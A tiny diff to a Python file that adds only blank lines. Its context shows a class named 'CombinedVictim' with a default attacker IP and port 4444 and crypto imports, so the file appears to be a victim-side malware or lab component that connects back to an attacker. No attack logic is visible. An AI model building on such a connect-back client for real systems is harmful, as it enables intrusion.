@@ -17,6 +17,7 @@ from Crypto.Util import Counter
 from Crypto.Random import get_random_bytes
 
 
+
 class CombinedVictim:
     def __init__(self, attacker_ip='198.168.100.4', attacker_port=4444):
         self.attacker_ip = attacker_ip
@@ -533,6 +534,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
